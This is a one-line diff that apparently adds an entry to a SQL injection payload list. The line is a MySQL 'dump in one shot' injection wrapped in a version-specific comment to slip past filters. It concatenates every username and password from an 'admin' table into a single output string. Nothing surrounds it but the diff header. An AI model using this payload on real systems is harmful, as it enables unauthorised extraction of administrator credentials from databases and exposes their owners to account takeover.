@@ -1,0 +1,1 @@
+/*!50000(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(admin)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,0x203a3a20,password,0x3c62723e))))x)*/
